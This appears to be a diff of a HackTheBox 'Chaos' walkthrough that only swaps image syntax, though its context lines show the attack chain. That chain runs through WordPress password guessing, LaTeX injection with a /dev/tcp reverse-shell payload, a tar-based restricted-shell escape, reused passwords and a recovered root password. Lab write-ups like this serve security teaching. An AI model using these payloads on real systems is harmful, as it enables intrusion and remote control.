@@ -71,11 +71,11 @@ I added `chaos.htb` to my `/etc/hosts` file since there's a DNS name returned fr
 
 Visiting the IP address alone blocks us:
 
-<figure><img src="../../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(73).png>)
 
 Visiting `chaos.htb` shows us a typical security company page:
 
-<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(71).png>)
 
 The website looked rather static, so I did a `gobuster` directory and `wfuzz` subdomain scan. The `gobuster` scan returned nothing of interest, while the `wfuzz` scan did return a `webmail` subdomain.
 
@@ -118,7 +118,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 The Wordpress site was rather simple as well, and just contained one locked article:
 
-<figure><img src="../../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(74).png>)
 
 I didn't have a password yet, so I ran a `wpscan` on the URL and found one user named `human`:
 
@@ -133,21 +133,21 @@ $ wpscan --api-token my_token --enumerate p,t,u --url http://10.129.253.192/wp/w
 
 Using `human` as the password worked, and we could see the post:
 
-<figure><img src="../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(75).png>)
 
 Now, we can add the `webmail` subdomain to the `/etc/hosts` file and enumerate that next. When visited, it just shows a typical Roundcube login page:
 
-<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(72).png>)
 
 Using the credentials we found earlier, we can login to view the dashboard:
 
-<figure><img src="../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(76).png>)
 
 ### Webmail Files -> Hidden URL
 
 Within the Drafts of the user, I found one message with 2 files called `enim_msg.txt` and `en.py`:
 
-<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(77).png>)
 
 Here's the contents of the Python script:
 
@@ -229,11 +229,11 @@ Ayush
 
 The URL shows a PDF maker thing:
 
-<figure><img src="../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(78).png>)
 
 Sending requests doesn't seem to do anything, so I took a look at it within Burpsuite:
 
-<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(79).png>)
 
 The above reveals that it is running an outdated version of pdfTeX. There are multiple methods of which we can use LaTeX injection to get RCE:
 
@@ -241,11 +241,11 @@ The above reveals that it is running an outdated version of pdfTeX. There are mu
 
 I used `\immediate\write18\{id}` to test, and it worked:
 
-<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(80).png>)
 
 Using `\immediate\write18{bash -c 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'}` will get us a reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(81).png>)
 
 ## Privilege Escalation
 
@@ -264,7 +264,7 @@ drwx------  5 sahay sahay 4096 Jul 12  2022 sahay
 
 `ayush` uses the same password of `jiujitsu`.
 
-<figure><img src="../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(82).png>)
 
 `ayush` has a restricted shell.
 
@@ -316,7 +316,7 @@ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 
-<figure><img src="../../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(83).png>)
 
 ### Mozilla Creds -> Root
 
@@ -370,6 +370,6 @@ Password: 'Thiv8wrej~'
 
 Then, `su` to `root`!
 
-<figure><img src="../../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(84).png>)
 
 Interestingly, these are credentials for the Webmin instance present on the machine.
